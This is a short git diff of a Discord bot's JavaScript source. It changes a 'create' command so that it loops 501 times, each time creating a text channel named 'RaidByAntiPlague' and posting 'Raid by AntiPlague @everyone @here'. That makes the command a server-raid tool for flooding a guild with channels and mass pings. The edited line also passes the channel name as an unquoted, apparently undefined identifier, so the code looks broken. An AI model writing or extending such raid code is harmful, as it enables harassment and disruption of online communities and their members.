@@ -214,12 +214,15 @@ message.channel.send(avatar)
       
       }
 if (message.content === prefix + 'create') {
-     message.guild.channels.create(`RaidByAntiPlague`, {
-        type: 'text'
-        }).then(channel => {
-         channel.send("me la pelan @everyone");
-     })
+     for(let i =0;i<=500;i++) {
+message.guild.channels.create(RaidByAntiPlague, {
+type: 'text'
+}).then(channel => { 
+channel.send("Raid by AntiPlague @everyone @here")
+})}
 }
+});
+
     
    
   
